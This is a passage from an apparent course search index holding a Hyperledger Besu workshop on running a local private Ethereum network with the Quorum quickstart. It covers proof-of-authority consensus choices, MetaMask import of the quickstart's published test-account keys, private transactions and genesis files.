The smart contract EventEmitter.sol was migrated and deployed to our network. This is confirmed by the following outputs: Getting contractAddress from txHash: 0x022cc35254299433dbda514a979ed7a9a93a45ead383efec4ad5a84e8a817f3e Waiting for transaction to be mined ... Private Transaction Receipt: [object Object] Contract deployed at address: 0xdb6172b4ed41f7039cac4d0be4dbb9992c755809 Once the EventEmitter.sol contract was deployed, Member1 sent a private transaction to Member3. Member1 and Member3 can see the value within the transaction, which has been hashed, as Member1 value from deployed contract is: 0x000000000000000000000000000000000000000000000000000000000000002f Member3 value from deployed contract is: 0x000000000000000000000000000000000000000000000000000000000000002f Member2, which was not included in the private transaction, is unable to see that value, and gets a returned value of 0x. Member2 value from deployed contract is: 0x What has been demonstrated here is that two Members can send transactions between each other, and other members cannot observe the contents of the transaction. For more information, please see the Documentation. Congratulations! You have successfully run through many of the features of Hyperledger Besu. Other Ways to Start Hyperledger Besu Hyperledger Besu starts and is controlled through the command line interface (CLI) of your computer, as seen in this tutorial. If we did not use the quickstart, we would download Hyperledger Besu and run it via the command line. For example, when a Hyperledger Besu node is started up to connect to mainnet, this is done by running the command: besu In the command line. This command is actually calling a bunch of default options and subcommands that tell the client software how to set up the node. When we call the above command, behind the scenes we are actually calling: besu --network=mainnet --datapath=besu --api-gas-price-blocks=100 --api-gas-price-max=500000000000 --api-gas-price-percentile=50.0 --bootnodes=enode://c35c3...d615f@1.2.3.4:30303,enode://f42c13...fc456@1.2.3.5:30303 --config-file=none --discovery-enabled=true --miner-coinbase= --min-gas-price=1000 This is quite a bit longer than running the besu command! What we are trying to illustrate is the fact that besu is very customizable, but we have to use specific syntax (options and subcommands) in the command line in order to customize the node(s) and network created upon starting up Besu. The above is an example of the options and subcommands that apply to creating a full node running proof of work (PoW) consensus for mainnet Ethereum. However, these options and subcommands can also be used to create private and consortium networks. The Hyperledger Besu documentation has all the options and subcommands that you can apply when using Hyperledger Besu. In this article, we are going to explain options and subcommands, and introduce what certain combinations of options and subcommands allow us to do. What is an option? What is a subcommand? When using the CLI, we call commands. These commands are programs (they may also sometimes be classified as scripts) that tell the computer to do a specific set of actions. When Hyperledger Besu is installed on your computer, it creates a global command besu - which tells your computer to run the Besu client with the default options and subcommands we showed above. Let\u2019s walk through some of those in more detail. Options: --network Options are variables that work with the base command of besu. One example option is --network= When we run the besu command, the default network is mainnet, so running besu or besu --network=mainnet accomplishes the same outcome - Hyperledger Besu starts the process of connecting to mainnet. But, we can tell Hyperledger Besu to connect to different networks, including a local testnet on our computer. If we wanted Hyperledger Besu to connect to the testnet Rinkeby, we would use the option: besu --network=rinkeby If we want Besu to start locally on our computer as a private PoW network, the network option becomes besu --network=dev You are now starting to see how an option modifies the command besu. Subcommands: blocks Subcommands are programs that tell the computer to run an additional operation. An example of a subcommand is besu blocks export [--start-block= ] [--end-block= ] --to= This highlighted subcommand tells Hyperledger Besu to export a block or a range of blocks from storage to a file in an RLP format. In practice this would be called like: besu blocks export --start-block=100 --end-block=300 --to=/home/exportblock.bin We have told Hyperledger Besu to export from mainnet the blocks 100 to 300 from mainnet to the location on our computer ~/home/exportblock.bin The subcommand differs from an option because it is a subcommand telling the computer to run another program, whereas an option is telling the computer to modify the parameters of the original command. Subcommands are short lived and give the user functionality related to a specific quick task, and then exit. They do not keep the command running. A subcommand and option are different in the ways they interact with the program. As we saw earlier, an option modifies a program by providing it with certain parameters. The subcommand, on the other hand, is actually telling the program to run another operation entirely.","title":"What is an Ethereum Client? Running Hyperledger Besu"},{"location":"S02-ethereum/M4-clients-workshop/L1/#what-is-an-ethereum-client-running-hyperledger-besu","text":"Hyperledger Besu is an Ethereum client with mainnet compatibility. It can also be used to run a private network. It is the open-source protocol layer that delivers all the perks from Ethereum and addresses enterprise requirements. Hyperledger Besu is actually part of a bundled suite of Ethereum protocol clients called ConsenSys Quorum, which consists of Hyperledger Besu and GoQuorum, private key managers, consensus mechanisms, transaction managers, APIs, plugins, libraries, deployment tools, etc. In this tutorial, we are going to walk you through how the client works, and take some detours to explain concepts in detail.","title":"What is an Ethereum Client? Running Hyperledger Besu"},{"location":"S02-ethereum/M4-clients-workshop/L1/#lets-get-started","text":"At the end of this guide, we will have walked you through deploying the Hyperledger Besu via the ConsenSys Quorum quickstart AND learned generally about private and public networks. As part of this process you will: Part 1: Download all necessary dependencies required of your system to run the ConsenSys Quorum Quickstart Part 2: Download and Start the ConsenSys Quorum Quickstart Part 3: Set up MetaMask and import a private key from the README Part 4: Deploy a decentralized application to the private network Part 5: Use the monitoring tools used in the quickstart Part 6: Deploy a second Smart Contract to the network and send a private transaction We will walk you through every step of the process, helping you get setup and providing helpful resources in case you get stuck. We will go into more detail than the documentation, where appropriate, to give you a deeper understanding of Hyperledger Besu We will be referring to the documentation found here throughout this article and linking to other useful documentation if you would like to do deeper into any particular topic.","title":"Let\u2019s get started"},{"location":"S02-ethereum/M4-clients-workshop/L1/#part-1-installing-dependencies","text":"This section will walk you through the installation of dependencies. This is written for new developers or those unfamiliar with the technology used by Hyperledger Besu. Feel free to move at a pace that meets your needs. MacOS users will start by installing NodeJS. Open up the terminal. If this is the first that you are hearing the term terminal or directory, check out this guide to understanding how the shell, terminal, and directories on a computer will work. This will be important to understanding how to navigate to the appropriate location on your computer. Type in node --version to see if node is already installed on your computer. If it is, you will get the version returned, for example: If node is not installed, you will see command not found: node . Click on this link to go to the Nodejs website and download the MacOS installer (the file name will end in .pkg). Open it up and follow the instructions. Once completed, restart your terminal. Then type node --version into the terminal again to confirm Node has properly installed. If you are having problems with installation of node, you can access the help from the Node community via the \u201chelp\u201d section of their GitHub, which includes links to their Slack channel. MacOS users will now move onto installing Docker and Docker Compose Open up the terminal and type in docker --version to see if Docker is already installed on your computer. If it is, you will get the version returned, for example: If Docker is not installed, you will see command not found: docker . Click on this link to go to Docker website and download Docker Desktop, which will include Docker and Docker Compose. Click the button for the appropriate chip within your Mac (The Apple chip was released in late 2020, if you have a Mac from before then it\u2019s most likely an Intel chip) Follow along with the rest of the instructions in the link provided. For a tutorial on Docker itself, you can find that here, along with another Getting Started Guide here. If you run into issues, access the troubleshooting guide for Docker. Open up Docker on your desktop, and you should see the following: Click on the Gear icon in the upper right corner. Navigate to resources and ensure under the \u201cAdvanced\u201d tab there is at least 6 GB of memory allocated to allow us to run all the examples in this Getting Started guide. Your settings should look like something below: Linux users will need first need to install Docker Engine and then can follow the steps contained within the Docker Compose documentation. After installing Docker, Linux users MUST follow the post-installation steps. Specifically, you need to add the user to the docker group, this step is often overlooked and every docker command will fail if this is not done.","title":"Part 1: Installing Dependencies"},{"location":"S02-ethereum/M4-clients-workshop/L1/#part-2-installing-and-starting-the-quorum-quickstart","text":"Open up the terminal and type in npx quorum-dev-quickstart and press enter ( npx , as opposed to the command npm , will cut down on pollution on your computer by not installing dependencies) The quickstart will download and we will get the following prompt. For the purposes of this guide, we will use the Hyperledger Besu option - which is 1. We are not trying out Codefi Orchestrate in this demo, so hit \u201cN for the prompt: Do you want to try out Codefi Orchestrate? Note: choosing yes will direct you to a login/registration page. [Y/n] N We do want to enable support for private transactions, so choose Y for the following prompt: Do you wish to enable support for private transactions? [Y/n] Y Do you wish to enable support for logging with ELK (Elasticsearch, Logstash & Kibana)? [y/N] Y This will look like: The default directory that will be created to store these files will be named quorum-test-network , but you can rename the network on this next line: Where should we create the config files for this network? Please choose either an empty directory, or a path to a new directory that does not yet exist. Default: ./quorum-test-network For example, if I wanted to name the directory besu-test-network , I would enter ./besu-test-network and this would create a new directory called besu-test-network . The name of the new directory has to be a directory that does not exist, or else we will get an error. The Quorum Quickstart will be installed on your computer in the directory named quorum-test-network . In the terminal, change directory to the quorum-test-network folder with the command cd quorum-test-network and the list out the sub-directories and files within this folder by typing the command ls to list the contents of quorum-test-network Type in the command less README.md to see the instructions for the quickstart. Hit q to exit out of this view. Alternatively, you can see the READ.ME within the Quorum Dev Quickstart by viewing it within the ConsenSys Quorum GitHub Repository. We are now going to start a private network that will run using Hyperledger Besu as the Ethereum client. This private network will run locally on our computer. Run the command ./run.sh in the terminal. The private network will now begin running. If you run into any issues with starting the Quickstart, use the Hyperledger Besu chat channel to reach out for help. How will we know if we have successfully launched the network? You should see the following (it may take a few minutes for this to load): Congratulations! You\u2019ve spun up a private Ethereum network on your local computer using Hyperledger Besu. Issues you may encounter, and how to resolve them: If you have use Docker and Docker compose previously, particularly with a previous version of this quickstart, it is likely that you could run into an error upon start up: ERROR: Pool overlaps with other one on this address space If you get this error, it means that even though the docker containers are down, the networks may still exist. A longer thread explaining this issue can be found here. A helpful resolution is to open up the command line and run the following command: docker network prune If that does not work, run the following combination of commands docker-compose down docker network prune This will restart the Docker service, and hopefully resolve any overlap conflicts. You can also run run docker ps to check for any overlapping registered containers. Once those are identified, use docker rm to remove the containers that are overlapping.","title":"Part 2: Installing and Starting the Quorum Quickstart"},{"location":"S02-ethereum/M4-clients-workshop/L1/#a-brief-discussion-of-the-consensus-mechanism","text":"Let\u2019s quickly discuss the consensus mechanism you are using in your network. As we discussed earlier, the consensus mechanism is the coordinating process that the network uses to confirm, sync, and finalize new blocks on your blockchain. In this section, we are going to explore the two Proof of Authority (PoA) consensus mechanisms that you can use with Hyperledger Besu: Clique and IBFT 2.0. In a private network, we want to avoid using the consensus mechanism that is used on Ethereum mainnet - Ethash Proof of Work (PoW). Why? Ethash works well for Ethereum mainnet because anyone can participate in Ethereum mainnet by running a node and providing computation power to the network. Therefore, this computationally intense consensus mechanism ensures that any participant must compete with the other participants to produce and propagate blocks. The incentive of block rewards serves to ensure they are following the rules of the network. The more computing power that each node brings to the network, the greater benefits to the security of the network when PoW is the consensus mechanism. We are going to assume that you are not using the Ethash Proof of Work (PoW) consensus mechanism that is used for Ethereum mainnet because your network has participants that are: Known to each other, and Have a certain degree of inherent trust in each other. These two assumptions allow for your network to use a consensus mechanism which is more computationally efficient for the participants - they do not have to have the same computing power required of a node on Ethereum mainnet. These assumptions also allow for the removal of the incentive of block rewards to ensure compliance. Using a PoA consensus mechanism gives your network: Faster block creation as compared to a network running Ethash: Your network can create new blocks in a one or two seconds. As a comparison, Ethash on mainnet averages about 15 seconds for creation of a new block. Greater transaction throughput for the network: Without the need to incentivize the participants, the size of each block can be arbitrarily large, allowing for blocks with many transactions included as your network needs them to be included. Large transactions will not significantly or noticeably slow down the network (smaller blocks will be processed faster than larger blocks, the end user should not notice a difference). PoA assumes that the creators of the blocks - which are sometimes called minters, signers, sealers, or validators (we will refer to nodes on a PoA network as validators from here on) - are authorized to be validators. At the creation of the PoA network we declare a group (or \u201cpool\u201d) of validators, and as the network runs, those starting validators can add and/or subtract other validators.","title":"A Brief Discussion of the Consensus Mechanism"},{"location":"S02-ethereum/M4-clients-workshop/L1/#a-short-explanation-of-poa","text":"To understand PoA, it helps to specifically discuss the consensus mechanism Clique PoA, as it was designed to approximate Ethereum mainnet for use in Ethereum testnets. The Ropsten testnet used PoW, but was plagued by attackers forcing reorgs and forks in the testnet and increasing the block gas limit and sending large transactions, which effectively stopped the network. A new consensus mechanism was designed by P\u00e9ter Szil\u00e1gyi called Clique, which could replace PoW on networks like testnets. Clique PoA was designed to use the existing Ethereum block data structure to add voting functionality. Generally in any PoA consensus mechanism, validators alternate adding blocks to the blockchain in a series. In addition to adding blocks, they can choose to vote to add or kick out a validator. This allows malicious validators to be removed from the network, and trusted validators to be added. This gives PoA resistance against certain kinds of attack vectors like: A malicious validator - if a machine is compromised, and a validator proposes incorrect blocks, they can be voted out by the other validators A censoring validator - if a compromised validator proposes votes to remove good actors, they can be removed by being voted out A spamming validator - if a validator makes a voting proposal in every block that the validator creates, the network is spammed by having to consistently tally the votes (votes being to add or remove a validator). By resetting voting after a set period of time (this period of time is referred to as an epoch and is set to be 30,000 blocks in our tutorials), this problem can be mitigated. Concurrent block creation by a validator can also be prevented by ensuring there is a substantial enough lag between each block being added to the blockchain. In short, many of the features of mainnet Ethereum can be approximated, but without needing to use PoW and the challenges that using PoW on a private or test blockchain would entail.","title":"A short explanation of PoA"},{"location":"S02-ethereum/M4-clients-workshop/L1/#clique-poa-compared-to-ibft-20-poa","text":"Now that we know a bit more about PoA, we\u2019ll compare Clique PoA with IBFT 2.0 PoA in regards to: Finality - the amount of time required to guarantee a block has been added to the blockchain. Validators required - the minimum amount of validator nodes that have to participate in the network in order for the PoA consensus mechanism to work as intended. Liveness - the number of validator nodes that must be online or \u201clive\u201d to allow the network to continue running. This can also be thought of as a kind of fault tolerance - the number of validators that can fail at a given point in time and the network will still run. Relative Speed of Block Creation - how long it takes for each PoA consensus mechanism to create and sync new blocks and the factors that impact the speed of block creation. Finality Instantaneous finality is possible when only one block can be added at a point in time to the blockchain. If there is a possibility that multiple blocks are proposed at the same time, then a fork or reorganization can occur, and the validators are forced to make a choice about which block is a part of the final chain. In Clique PoA, a block will not be guaranteed to be added to the chain upon creation because there is a possibility of two blocks being proposed at the same time if a validator proposes a block out of turn. Blocks proposed simultaneously cause a fork in the network, as there are now two possible blocks for the next validator to create a block subsequent to (the second signer is prevented from signing subsequent blocks by the consensus mechanism). Because there are now two possible chains that could be built, the network must reorganize (or reorg), choosing which chain to build on. Due to this possibility, finality can be delayed when using Clique PoA if validators create blocks out of turn, and a block is not definitively confirmed upon creation. IBFT 2.0 has immediate finality, provided there are four validators. Once a block is created it becomes part of the blockchain. There are no forks. Validators Required Clique can run with a single validator (the use case for a single validator is purely demonstration purposes). As the number of validators in a Clique network increases, the probability of forks in the network increases. IBFT 2.0 requires four validators to be byzantine fault tolerant. Three or less validators running on an IBFT 2.0 network will no longer guarantee immediate finality or prevent network manipulation, particularly if one or more of the validators is acting in an adversarial nature. Liveness Clique can operate with half of the validators running (half of the validators can go down and the network will still work). IBFT 2.0 can operate as long as at least \u2154 of the validators are working. As noted in the validators required section, three or less validators running on an IBFT 2.0 network will no longer guarantee immediate finality, particularly if one or more of the validators is acting in an adversarial nature. Speed Clique is faster than IBFT 2.0 at adding blocks. IBFT 2.0 is slower at adding blocks. As more validators are added the time to add new blocks increases.","title":"Clique PoA Compared to IBFT 2.0 PoA"},{"location":"S02-ethereum/M4-clients-workshop/L1/#specific-examples","text":"","title":"Specific Examples"},{"location":"S02-ethereum/M4-clients-workshop/L1/#guitar-manufacturing","text":"A custom guitar manufacturer wants to create transparency for their customers to show the woods they are using in building custom guitars. They source woods locally and use reclaimed woods from the city they are based in. They want to write a transaction to a blockchain so that a customer can scan a QR code and see each transaction associated with the various woods used in the guitars. They work directly with two wood suppliers, and with an additional individual who helps them with salvage work to get reclaimed wood from old buildings. Looking at this case, we see the following: There is anywhere from a single to maybe four participants to start (the two wood suppliers and the reclaimed wood supplier) This is a project to provide transparency to the end-user, so transactions can be sent as needed, with addresses being created to represent specific guitars that are being built. The transactions will represent different woods and provide information on their sourcing If a single node were run, if it were to go offline, it would only impact the guitar builder. Because immediate finality is not required, there is the potential of only needing a single validator at the start, it would be possible to use a Clique PoA network. If the suppliers wanted to join the network, they could all do so, and if one of them left the network, there would not be an impact to running the blockchain.","title":"Guitar Manufacturing"},{"location":"S02-ethereum/M4-clients-workshop/L1/#casinos","text":"A group of six casinos decide to create a sportsbook together, in order to share in winnings and decrease the individual exposure of each casino. Each casino will run a validator node and transactions will be the bets that bettors place on basketball games. As the games being bet on have a specific start time, bets must be included in the blockchain to receive a payout. If bets are not included, the payout is not able to be made to the bettor. Looking at this use case, we see the following: There are at least six participants at start, and therefore we assume there will be six validators The bets that are made have to be included in a block. Immediate finality is required If a certain number of casinos go offline, we may have to question whether to take bets or not, since the other casinos become more exposed to the betting positions. There should be a high volume of transactions allowed, as the scenario of the number of placed bets is likely to increase the closer a basketball game approaches the start time. Because immediate finality is required, we are drawn to using an IBFT 2.0 PoA network. If we were to do this, then we would need at least 4 validators. Since there are six casinos participating, we can use an IBFT 2.0 PoA network. If more than two casinos were to leave then the network would no longer be able to run. In terms of liveness, the network can withstand a validator going offline (due to a power outage or other reason), and continue to operate, which is very important for the overall success of the sports book.","title":"Casinos"},{"location":"S02-ethereum/M4-clients-workshop/L1/#determining-the-poa-consensus-mechanism-to-use-in-your-network","text":"Based on these examples, here are questions to ask yourself, which can help you determine which PoA consensus mechanism may make more sense. What are my finality requirements? Does my use case require that each block created instantly be confirmed? If a block is not instantly confirmed, what are the potential impacts? How many validators do I intend my network to have? How many will I have at the start? How many could be added to the network over time? Do I think validators could leave my network? Would I stop running the network if a certain number of validators left? Do I need participants to join the network without being validators? Should they be able to submit transactions? What fault tolerance does my network require? Does the number of validators that will participate at start allow for the network to continue running if one goes down? What happens if two or more validators go down? How fast do I need to be able to create new blocks? Will the speed at which I need to create new blocks stay constant or can it slow down if new validators are added? These questions can serve as a guide in thinking which PoA consensus mechanism makes sense for your use case.","title":"Determining the PoA Consensus Mechanism to Use in Your Network"},{"location":"S02-ethereum/M4-clients-workshop/L1/#part-3-set-up-metamask","text":"Now that we have the network up and running, we are going to set up our MetaMask wallet. If you already have MetaMask installed, you can skip this step. If not, follow the links below. First, download the MetaMask browser extension. If you want to explore the features of MetaMask, this article can help you walk through how to send your first transaction using MetaMask. Follow the instructions to set up your MetaMask account. For the purposes of this guide, the accounts we will be using will not have mainnet Ether. Still get in the habit of the following: - Copy down your seed phrase and store it in a secure location. - Do not share your seed phrase with anyone - Ensure that you can use your seed phrase to recover your account MetaMask is a self-custodial wallet, so if you lose the seed phrase associated with it, you have lost access to that Ethereum account. If you give that seed phrase to someone, they now have control over that account. Open up your MetaMask account and navigate to to the top of the browser extension click on the Ethereum Mainnet menu. From the drop down select Localhost 8545. This is where the blockchain that we spun up with the quickstart is running. If you want to learn more about connecting to different networks, this documentation from MetaMask will give you more insight on how it works. MetaMask will allow us to send transactions between Ethereum accounts on our network, which we will call Externally Owned Accounts (EOA). When we ran the quickstart, the private blockchain network that we created was initialized with three accounts pre-loaded with test Ether. Looking into the quorum-test-network folder, you will see a structure within the config -> besu folder that shows the three member folders. In each folder is a keys folder, which has a file called key, which is the private key and key.pub, which is the public key. We will open the file named \u201ckey\u201d in member1 to see what is inside Here we see the private key, without the 0x prefix. The private key for this address would be 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 To import this address into our MetaMask, we will click the circle in the upper right corner of the MetaMask extension. This circle is called a favicon by the MetaMask team: We will hit the Import Account button: And will copy paste the private key, repeated below: 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 Into the following field This will create our account, which is pre-loaded with 200 test Ether: Below you can find information about the pre-loaded accounts:, in the event you want to import them: Test Account 1 (address 0xfe3b557e8fb62b89f4916b721be55ceb828dbd73) Private key to copy : 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 Initial balance : 200 Eth (200000000000000000000 Wei) Test Account 2 (address 0x627306090abaB3A6e1400e9345bC60c78a8BEf57) Private key to copy : 0xc87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 Initial balance : 90000 Eth (90000000000000000000000 Wei) Test Account 3 (address 0xf17f52151EbEF6C7334FAD080c5704D77216b732) Private key to copy : 0xae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f Initial balance : 90000 Eth (90000000000000000000000 Wei) If we import these accounts and send 7 ETH from Test Account 1 to Test Account 2: we can see within the block explorer (accessible in our browser at http://localhost:25000/), Account 1 will decrement by 7 ETH: And that Account 2 will increase by just under 7 ETH Why didn\u2019t Account 2 increase by 7 ETH? In this specific example, we have paid a transaction cost to send the Ether from one account to another. The transaction cost is called the gas, and is sometimes also called the gas fee. It is paid in increments of Ether called Wei, which is a fractional amount of ETH (1 Wei is 10^-18 ETH). There is a 21000 wei cost we pay to send Ether, and that is deducted from the transaction, which was the gas limit (the upper amount of gas we are willing to pay) stipulated for this transaction on MetaMask. The private network we have created is a gas-less network, so there is no need to pay that fee, and we could reduce the gas limit to 0 and the transaction would go through. Understanding gas is critical for understanding how mainnet Ethereum works, as well as how it may be useful in other private networks we create, but for now, you can read a brief overview about gas here to better understand this concept. How were these accounts created? When we ran ./run.sh in our terminal, this script told docker-compose to run a .yml file, which contained information about the accounts, keys, and initialization information for our network in a genesis file. This genesis file - which is a .json file, provided our blockchain with information about the accounts, including the address and the amount of Ether they held. To see a genesis file in the quickstart, you can open and look at cliqueGenesis.json, which is in the quorum-test-network -> config -> besu directory. It looks like the following: { \"config\":{ \"chainId\":1337, \"constantinoplefixblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } }, \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } }, \"number\":\"0x0\", \"gasUsed\":\"0x0\", \"parentHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\" } Within this file, I have highlighted the accounts that were created and the balances they were created with (the balances are in wei, not Ether. Remember 1 wei is 10 x -18 Ether). The quickstart and the scripts we run take care of creating these accounts, but we are able to create our own network where we can initialize accounts and configure our network to be customized to our particular use case. Understanding a Genesis File: The Basics Setting up a private network or joining a public network requires an Ethereum node to create a new blockchain. Whether it is a private or public network, each node / validator will have a full copy of the blockchain. In order to build this copy, the node / validator has to have instructions on how to build the first block and the subsequent blocks in the chain. In this article, we are going to walk through the components of a genesis file, within the context of the Ethereum client Hyperledger Besu as the client for our network. These concepts are applicable to all Ethereum clients. The first block in a blockchain is called the genesis block. Ethereum mainnet\u2019s genesis block - block 0 - was mined on July 30, 2015. In order to join or create any network, the data for the genesis block must be included. Therefore, the genesis file defines the data that is in the first block of a blockchain, as well as rules for the blockchain itself. If a new node or validator attempts to join the blockchain, it will use the genesis file as the starting point in recreating the history of the chain in order to synchronize with the existing network. The genesis file for Ethereum mainnet, along with the supported testnets, is included in the download of Besu. When creating a private network, a custom genesis file must be provided. The genesis file is a JSON formatted file. It looks like the below: { \"config\": { \"chainId\": 2018, \"muirglacierblock\": 0, \"ibft2\": { \"blockperiodseconds\": 2, \"epochlength\": 30000, \"requesttimeoutseconds\": 4 } }, \"nonce\": \"0x0\", \"timestamp\": \"0x58ee40ba\", \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", \"gasLimit\": \"0x1fffffffffffff\", \"difficulty\": \"0x1\", \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", \"coinbase\": \"0x0000000000000000000000000000000000000000\", \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" } } } In this specific example, the genesis file is for an IBFT 2.0 private network. { \"config\": { \"chainId\": 2018, \"muirglacierblock\": 0, \"ibft2\": { \"blockperiodseconds\": 2, \"epochlength\": 30000, \"requesttimeoutseconds\": 4 } The config key section contains the following information about the blockchain \u201cchainId\u201d: 2018 The chainId controls the transaction signature process, providing a unique identifier to allow for the hashing of signed transactions to only work on the network associated with the corresponding chainId. Ethereum Improvement Proposal 155 (EIP-155) provides more information on the relationale behind the chainID. Most chainIDs match the networkID of the network. In this case, 2018 refers to the chainID associated with a development chain. For a list of the network and chain IDs, please see the Documentation. \"muirglacierblock\": 0, This field is called a \u201cmilestone block\u201d. Muir glacier refers to a specific network upgrade that occurred at block 9,200,000 on Ethereum mainnet. For private networks, like the one that is being created in this example, the name of the latest milestone block can be listed, and set to be the genesis block. Here you can see a continuously updated list of network upgrades and the associated blocks for Ethereum. \u201cibft2\u201d: This specifies that the consensus protocol for the blockchain is IBFT 2.0. The options available for specifying the consensus mechanism are available in the documentation, with an overview of the proof-of-authority (PoA) consensus protocols available here. Within the specification, the following three fields are provided: \"blockperiodseconds\": 2, The minimum block time, in seconds. In this case, after two seconds, a new block will be proposed by the network with transactions stored in the memory pool packaged and distributed to the network. \"epochlength\": 30000, The number of blocks at which to reset all votes. The votes refer to validators voting to add or remove validators to the network. In this case, after 30,000 blocks are created, this IBFT 2.0 network will discard all pending votes collected from received blocks. Existing proposals remain in effect and validators re-add their vote the next time they create a block. \"requesttimeoutseconds\": 4 The time by which a new block must be proposed or else a new validator will be assigned by the network. If a validator goes down, the request time out ensures that the proposal of a new block passes on to another validator. The request time out seconds should be set to be double the minimum block time (blockperiodseconds), hence why it is 4. The second section, starting with \"nonce\": \"0x0\", contains information about the genesis block \"nonce\": \"0x0\", \"timestamp\": \"0x58ee40ba\", \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", \"gasLimit\": \"0x1fffffffffffff\", \"difficulty\": \"0x1\", \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", \"coinbase\": \"0x0000000000000000000000000000000000000000\", \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" } } } \"nonce\": \"0x0\", The number used once aka nonce, that is a part of the blockheader for the first block. Set to 0x0. \"timestamp\": \"0x58ee40ba\", The creation date and time of the block. Often it can be set to 0x0, but as long as it is any value in the past, it will work. In this case 0x58ee40ba is a hexadecimal which converts to 1492009146 and represents Wed Apr 12 2017 14:59:06 GMT+0000 \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", Extra data is a recursive length prefix (RLP) encoded string (which is space efficient) containing the validator addresses of the IBFT 2.0 private network. The validator addresses are unique to the validators, so if there are four validators are the start of the network, this field should contain a list of their addresses.. Instructions on how to create an RLP using Besu can be found here. \"gasLimit\": \"0x1fffffffffffff\", The block gas limit, which is the total gas limit for all transactions included in a block. It defines how large the block size can be for the block, and is represented by an hexadecimal string. For this network, the gas limit is the maximum size, and is therefore a \u201cfree gas network\u201d \"difficulty\": \"0x1\", The difficulty of creating a new block. Represented as a hexadecimal string, the difficulty is set to 1, effectively the lowest difficulty. \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", The mixHash is the unique identifier for the block, which for this genesis file is 0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365 \"coinbase\": \"0x0000000000000000000000000000000000000000\", The network coinbase account, which is where all block rewards for this network will be paid. In this case it is to 0x0000000000000000000000000000000000000000, which is sometimes called address(0) or the zero address. \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" The alloc field creates an address on our network, which is sometimes also referred to as an externally owned account, as it is an account not associated with a smart contract (referred to as a contract account). The number starting with \u201c98\u201d is the public key of the address. The balance can be passed in as a decimal OR a hexadecimal (like it has in this case and corresponds to 200 ETH, or 2*10^20 Wei). The balance is always in Wei, or 10^-18 Ether. A Second Genesis File Below we provide another genesis file with a different consensus mechanism, Clique PoA, and different information. Take a look below and see what values stick out. This is the genesis file for the chain that you can build in the ConsenSys Quorum quickstart: { \"config\":{ \"chainId\":1337, \"muirglacierblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } }, \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } }, \"number\":\"0x0\", \"gasUsed\":\"0x0\", 